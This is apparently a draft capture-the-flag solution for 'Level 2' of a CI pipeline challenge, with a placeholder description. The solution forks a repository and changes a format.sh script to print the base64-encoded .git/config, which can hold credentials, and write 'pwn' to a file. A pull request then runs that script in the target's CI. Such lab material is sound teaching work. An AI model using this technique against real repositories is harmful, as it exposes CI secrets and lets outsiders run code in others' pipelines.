# Level 2 - TITLE

## Description

tktk

## Solution (NEED TO DOUBLE CHECK, is there also a way to do it by modifying directly Receive PR?)

1. Fork the repo
2. Create a new branch and modify `format.sh`:

```bash
#!/usr/bin/env bash

cat .git/config | base64
echo 'pwn' > output.md
```

3. Create a PR with the new branch
